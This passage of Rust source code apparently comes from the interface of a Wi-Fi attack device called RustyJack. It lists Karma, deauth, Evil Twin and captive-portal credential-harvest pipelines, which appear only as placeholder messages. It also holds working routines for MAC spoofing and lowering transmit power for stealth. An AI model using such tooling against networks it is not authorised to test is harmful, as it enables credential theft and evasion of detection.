                    "Looking for WiFi".to_string(),
                    "adapters...".to_string(),
                ]
            ),
            Some("DETECTED") => {
                let chipset = parts.get(1).unwrap_or(&"Unknown");
                (
                    "Device Found".to_string(),
                    vec![
                        format!("Chipset: {}", chipset),
                        "".to_string(),
                        format!("{} Preparing driver...", spinner),
                    ]
                )
            }
            Some("INSTALLING_PREREQUISITES") => (
                "Prerequisites".to_string(),
                vec![
                    format!("{} Installing build tools", spinner),
                    "".to_string(),
                    "This may take a few".to_string(),
                    "minutes...".to_string(),
                ]
            ),
            Some("INSTALLING_DRIVER") => {
                let package = parts.get(1).unwrap_or(&"driver");
                (
                    "Installing Driver".to_string(),
                    vec![
                        format!("Package: {}", package),
                        "".to_string(),
                        format!("{} Compiling...", spinner),
                        "".to_string(),
                        "This may take 5-10".to_string(),
                        "minutes on Pi Zero".to_string(),
                    ]
                )
            }
            Some("VERIFYING") => {
                let iface = parts.get(1).unwrap_or(&"wlan");
                (
                    "Verifying".to_string(),
                    vec![
                        format!("{} Testing interface", spinner),
                        "".to_string(),
                        format!("Interface: {}", iface),
                        "Checking functionality...".to_string(),
                    ]
                )
            }
            Some("BUILTIN") => {
                let chipset = parts.get(1).unwrap_or(&"Unknown");
                (
                    "Built-in Driver".to_string(),
                    vec![
                        format!("Chipset: {}", chipset),
                        "".to_string(),
                        format!("{} Loading firmware...", spinner),
                    ]
                )
            }
            Some("UNKNOWN") => {
                let usb_id = parts.get(1).unwrap_or(&"????:????");
                (
                    "Unknown Device".to_string(),
                    vec![
                        format!("USB ID: {}", usb_id),
                        "".to_string(),
                        "No driver available".to_string(),
                        "for this device.".to_string(),
                    ]
                )
            }
            _ => (
                "WiFi Driver".to_string(),
                vec![
                    format!("{} Working...", spinner),
                    "".to_string(),
                    status.to_string(),
                ]
            ),
        }
    }
    
    /// Launch Karma attack
    fn launch_karma_attack(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Karma Attack", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect",
                "to configure interface"
            ]);
        }
        
        // Explain what Karma does
        self.show_message("Karma Attack", [
            "Responds to ALL probe",
            "requests from devices.",
            "",
            "Captures clients looking",
            "for known networks.",
            "",
            "Very effective against",
            "phones and laptops!",
            "",
            "Press SELECT to start"
        ])?;
        
        // Duration selection
        let durations = vec![
            "2 minutes".to_string(),
            "5 minutes".to_string(),
            "10 minutes".to_string(),
        ];
        let dur_choice = self.choose_from_list("Karma Duration", &durations)?;
        
        let duration = match dur_choice {
            Some(0) => 120,
            Some(1) => 300,
            Some(2) => 600,
            _ => return Ok(()),
        };
        
        self.show_progress("Karma Attack", [
            "Listening for probes...",
            "",
            "Responding to all SSIDs",
        ])?;
        
        // Execute via core (placeholder - would call actual karma)
        self.show_message("Karma Active", [
            &format!("Interface: {}", active_interface),
            &format!("Duration: {} sec", duration),
            "",
            "Capturing probe requests",
            "and responding to all.",
            "",
            "Press BACK to stop"
        ])?;
        
        Ok(())
    }
    
    /// Launch an attack pipeline
    fn launch_attack_pipeline(&mut self, pipeline_type: PipelineType) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Attack Pipeline", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect",
                "to configure interface"
            ]);
        }
        
        let (title, description, steps) = match pipeline_type {
            PipelineType::GetPassword => (
                "Get WiFi Password",
                vec![
                    "Automated sequence to",
                    "obtain target password:",
                ],
                vec![
                    "1. Scan networks",
                    "2. PMKID capture",
                    "3. Deauth attack",
                    "4. Capture handshake",
                    "5. Quick crack",
                ]
            ),
            PipelineType::MassCapture => (
                "Mass Capture",
                vec![
                    "Capture handshakes from",
                    "all visible networks:",
                ],
                vec![
                    "1. Scan all networks",
                    "2. Channel hopping",
                    "3. Multi-target deauth",
                    "4. Continuous capture",
                ]
            ),
            PipelineType::StealthRecon => (
                "Stealth Recon",
                vec![
                    "Passive reconnaissance",
                    "NO transmission:",
                ],
                vec![
                    "1. Randomize MAC",
                    "2. Minimum TX power",
                    "3. Passive scan only",
                    "4. Probe sniffing",
                ]
            ),
            PipelineType::CredentialHarvest => (
                "Credential Harvest",
                vec![
                    "Capture login creds",
                    "via fake networks:",
                ],
                vec![
                    "1. Probe sniff",
                    "2. Karma attack",
                    "3. Evil Twin APs",
                    "4. Captive portal",
                ]
            ),
            PipelineType::FullPentest => (
                "Full Pentest",
                vec![
                    "Complete automated",
                    "wireless audit:",
                ],
                vec![
                    "1. Stealth recon",
                    "2. Network mapping",
                    "3. PMKID harvest",
                    "4. Deauth attacks",
                    "5. Evil Twin/Karma",
                    "6. Crack passwords",
                ]
            ),
        };
        
        // Show pipeline description
        let mut all_lines: Vec<String> = Vec::new();
        for line in description {
            all_lines.push(line.to_string());
        }
        all_lines.push("".to_string());
        for step in steps {
            all_lines.push(step.to_string());
        }
        all_lines.push("".to_string());
        all_lines.push("Press SELECT to start".to_string());
        
        self.show_message(title, all_lines.iter().map(|s| s.as_str()))?;
        
        // Confirm
        let options = vec!["Start Pipeline".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Confirm", &options)?;
        
        if choice != Some(0) {
            return Ok(());
        }
        
        // If target needed and not set, prompt for network selection
        let needs_target = matches!(pipeline_type, 
            PipelineType::GetPassword | PipelineType::CredentialHarvest);
        
        if needs_target && self.config.settings.target_network.is_empty() {
            self.show_message("Select Target", [
                "No target network set",
                "",
                "Scanning for networks...",
            ])?;
            
            // Scan and let user pick target
            self.scan_wifi_networks()?;
        }
        
        // Execute pipeline
        self.show_progress(title, [
            "Pipeline running...",
            "",
            "This is automated.",
            "Please wait.",
        ])?;
        
        // Placeholder - actual execution would happen here
        self.show_message("Pipeline Complete", [
            "Automated attack finished",
            "",
            "Check Loot folder for",
            "captured data.",
        ])?;
        
        Ok(())
    }
    
    /// Toggle MAC randomization auto-enable setting
    fn toggle_mac_randomization(&mut self) -> Result<()> {
        self.config.settings.mac_randomization_enabled = !self.config.settings.mac_randomization_enabled;
        let enabled = self.config.settings.mac_randomization_enabled;
        
        // Save config
        let config_path = self.root.join("gui_conf.json");
        if let Err(e) = self.config.save(&config_path) {
            return self.show_message("Config Error", [format!("Failed to save: {}", e)]);
        }
        
        let status = if enabled { "ENABLED" } else { "DISABLED" };
        self.show_message("MAC Randomization", [
            format!("Auto-randomize: {}", status),
            "".to_string(),
            if enabled {
                "MAC will be randomized".to_string()
            } else {
                "MAC will NOT be changed".to_string()
            },
            if enabled {
                "before each attack.".to_string()
            } else {
                "before attacks.".to_string()
            },
        ])
    }
    
    /// Toggle passive mode setting
    fn toggle_passive_mode(&mut self) -> Result<()> {
        self.config.settings.passive_mode_enabled = !self.config.settings.passive_mode_enabled;
        let enabled = self.config.settings.passive_mode_enabled;
        
        // Save config
        let config_path = self.root.join("gui_conf.json");
        if let Err(e) = self.config.save(&config_path) {
            return self.show_message("Config Error", [format!("Failed to save: {}", e)]);
        }
        
        let status = if enabled { "ENABLED" } else { "DISABLED" };
        self.show_message("Passive Mode", [
            format!("Passive mode: {}", status),
            "".to_string(),
            if enabled {
                "Recon will use RX-only".to_string()
            } else {
                "Normal TX/RX mode".to_string()
            },
            if enabled {
                "No transmissions.".to_string()
            } else {
                "will be used.".to_string()
            },
        ])
    }
    
    /// Launch passive reconnaissance mode
    fn launch_passive_recon(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Passive Recon", [
                "No interface selected",
                "",
                "Run Hardware Detect",
                "to select an interface."
            ]);
        }
        
        // Duration selection
        let durations = vec![
            "30 seconds".to_string(),
            "1 minute".to_string(),
            "5 minutes".to_string(),
            "10 minutes".to_string(),
        ];
        let dur_choice = self.choose_from_list("Recon Duration", &durations)?;
        
        let duration_secs = match dur_choice {
            Some(0) => 30,
            Some(1) => 60,
            Some(2) => 300,
            Some(3) => 600,
            _ => return Ok(()),
        };
        
        self.show_progress("Passive Recon", [
            "Starting passive mode...",
            "",
            "NO transmissions!",
            "Listening only.",
        ])?;
        
        // In real implementation, this would call rustyjack-wireless passive mode
        // For now, show what it would do
        self.show_message("Passive Recon", [
            &format!("Interface: {}", active_interface),
            &format!("Duration: {} sec", duration_secs),
            "",
            "Passive mode captures:",
            "- Beacon frames",
            "- Probe requests",
            "- Data (handshakes)",
            "",
            "Zero transmission mode"
        ])
    }
    
    /// Randomize MAC address immediately
    fn randomize_mac_now(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Randomize MAC", [
                "No interface selected"
            ]);
        }
        
        // First, save the original MAC if we haven't already
        if self.config.settings.original_mac.is_empty() {
            let mac_path = format!("/sys/class/net/{}/address", active_interface);
            if let Ok(mac) = std::fs::read_to_string(&mac_path) {
                self.config.settings.original_mac = mac.trim().to_uppercase();
            }
        }
        
        self.show_progress("Randomize MAC", [
            &format!("Interface: {}", active_interface),
            "",
            "Generating random MAC...",
        ])?;
        
        // Bring interface down
        let down_result = Command::new("ip")
            .args(["link", "set", &active_interface, "down"])
            .output();
        
        if down_result.is_err() {
            return self.show_message("MAC Error", [
                "Failed to bring down",
                "interface. Need root?"
            ]);
        }
        
        // Generate random MAC (locally administered, unicast)
        let random_mac = format!(
            "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
            (rand_byte() | 0x02) & 0xFE, // Locally administered, unicast
            rand_byte(),
            rand_byte(),
            rand_byte(),
            rand_byte(),
            rand_byte()
        );
        
        // Set new MAC
        let set_result = Command::new("ip")
            .args(["link", "set", &active_interface, "address", &random_mac])
            .output();
        
        // Bring interface back up regardless of success
        let _ = Command::new("ip")
            .args(["link", "set", &active_interface, "up"])
            .output();
        
        if let Ok(output) = set_result {
            if output.status.success() {
                // Save the new MAC in config
                let original_mac = self.config.settings.original_mac.clone();
                self.config.settings.current_mac = random_mac.clone();
                let config_path = self.root.join("gui_conf.json");
                let _ = self.config.save(&config_path);
                
                self.show_message("MAC Randomized", [
                    format!("Interface: {}", active_interface),
                    "".to_string(),
                    "New MAC:".to_string(),
                    random_mac,
                    "".to_string(),
                    "Original saved:".to_string(),
                    original_mac,
                ])
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                self.show_message("MAC Error", [
                    "Failed to set new MAC",
                    "",
                    "Driver may not support",
                    "MAC address changes.",
                    "",
                    &format!("{}", stderr.chars().take(30).collect::<String>())
                ])
            }
        } else {
            self.show_message("MAC Error", [
                "Failed to execute",
                "ip link command.",
                "",
                "Check permissions."
            ])
        }
    }
    
    /// Restore original MAC address
    fn restore_mac(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Restore MAC", [
                "No interface selected"
            ]);
        }
        
        // Check if we have a saved original MAC
        let original_mac = if !self.config.settings.original_mac.is_empty() {
            self.config.settings.original_mac.clone()
        } else {
            // Try to read the permanent hardware address
            let perm_path = format!("/sys/class/net/{}/address", active_interface);
            match std::fs::read_to_string(&perm_path) {
                Ok(mac) => mac.trim().to_uppercase(),
                Err(_) => {
                    return self.show_message("Restore MAC", [
                        "No original MAC saved",
                        "",
                        "MAC was not changed by",
                        "RustyJack, or original",
                        "was not recorded."
                    ]);
                }
            }
        };
        
        self.show_progress("Restore MAC", [
            &format!("Restoring: {}", original_mac),
        ])?;
        
        // Bring interface down
        let _ = Command::new("ip")
            .args(["link", "set", &active_interface, "down"])
            .output();
        
        // Set original MAC
        let result = Command::new("ip")
            .args(["link", "set", &active_interface, "address", &original_mac])
            .output();
        
        // Bring interface back up
        let _ = Command::new("ip")
            .args(["link", "set", &active_interface, "up"])
            .output();
        
        if let Ok(output) = result {
            if output.status.success() {
                // Clear the saved MACs
                self.config.settings.current_mac.clear();
                let config_path = self.root.join("gui_conf.json");
                let _ = self.config.save(&config_path);
                
                self.show_message("MAC Restored", [
                    &format!("Interface: {}", active_interface),
                    "",
                    &format!("MAC: {}", original_mac),
                    "",
                    "Original MAC restored."
                ])
            } else {
                self.show_message("Restore Error", [
                    "Failed to restore MAC",
                    "",
                    "Try rebooting to reset",
                    "the interface."
                ])
            }
        } else {
            self.show_message("Restore Error", [
                "Failed to execute",
                "restore command."
            ])
        }
    }
    
    /// Set TX power level
    fn set_tx_power(&mut self, level: TxPowerSetting) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("TX Power", [
                "No interface selected"
            ]);
        }
        
        let (dbm, label) = match level {
            TxPowerSetting::Stealth => (1, "Stealth (1 dBm)"),
            TxPowerSetting::Low => (5, "Low (5 dBm)"),
            TxPowerSetting::Medium => (12, "Medium (12 dBm)"),
            TxPowerSetting::High => (18, "High (18 dBm)"),
            TxPowerSetting::Maximum => (30, "Maximum"),
        };
        
        self.show_progress("TX Power", [
            &format!("Setting to: {}", label),
        ])?;
        
        // Try iw first (uses mBm)
        let result = Command::new("iw")
            .args(["dev", &active_interface, "set", "txpower", "fixed", &format!("{}00", dbm)])
            .output();
        
        let success = if let Ok(out) = result {
            out.status.success()
        } else {
            // Try iwconfig as fallback
            let result2 = Command::new("iwconfig")
                .args([&active_interface, "txpower", &format!("{}", dbm)])
                .output();
            result2.map(|o| o.status.success()).unwrap_or(false)
        };
        
        if success {
            self.show_message("TX Power Set", [
                format!("Interface: {}", active_interface),
                format!("Power: {}", label),
                "".to_string(),
                match level {
                    TxPowerSetting::Stealth => "Minimal range - stealth mode".to_string(),
                    TxPowerSetting::Low => "Short range operations".to_string(),
                    TxPowerSetting::Medium => "Balanced range/stealth".to_string(),
                    TxPowerSetting::High => "Normal operation range".to_string(),
                    TxPowerSetting::Maximum => "Maximum range".to_string(),
                }
            ])
        } else {
            self.show_message("TX Power Error", [
                "Failed to set power.".to_string(),
                "".to_string(),
                "Interface may not".to_string(),
                "support TX power control.".to_string(),
            ])
        }
    }
}

/// Generate a pseudo-random byte
fn rand_byte() -> u8 {
    use std::time::{SystemTime, UNIX_EPOCH};
    static mut SEED: u64 = 0;
    unsafe {
        if SEED == 0 {
            SEED = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos() as u64;
        }
        SEED = SEED.wrapping_mul(6364136223846793005).wrapping_add(1);
        (SEED >> 33) as u8
    }
}

/// Auto-randomize MAC before attack if enabled in settings
/// Returns true if MAC was randomized (so caller knows to restore later)
pub fn auto_randomize_mac_if_enabled(interface: &str, settings: &crate::config::SettingsConfig) -> bool {
    if !settings.mac_randomization_enabled {
        return false;
    }
    
    // Bring interface down
    let _ = std::process::Command::new("ip")
        .args(["link", "set", interface, "down"])
        .output();
    
    // Generate random MAC
    let random_mac = format!(
        "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
        (rand_byte() | 0x02) & 0xFE,
        rand_byte(),
        rand_byte(),
        rand_byte(),
        rand_byte(),
        rand_byte()
    );
    
    // Set new MAC
    let result = std::process::Command::new("ip")
        .args(["link", "set", interface, "address", &random_mac])
        .output();
    
    // Bring interface back up
    let _ = std::process::Command::new("ip")
        .args(["link", "set", interface, "up"])
        .output();
    
    result.map(|o| o.status.success()).unwrap_or(false)
}

/// Restore original MAC from saved settings
pub fn restore_original_mac(interface: &str, original_mac: &str) -> bool {
    if original_mac.is_empty() {
        return false;
    }
    
    let _ = std::process::Command::new("ip")
        .args(["link", "set", interface, "down"])
        .output();
    
    let result = std::process::Command::new("ip")
        .args(["link", "set", interface, "address", original_mac])
        .output();
    
    let _ = std::process::Command::new("ip")
        .args(["link", "set", interface, "up"])
        .output();
    
    result.map(|o| o.status.success()).unwrap_or(false)
}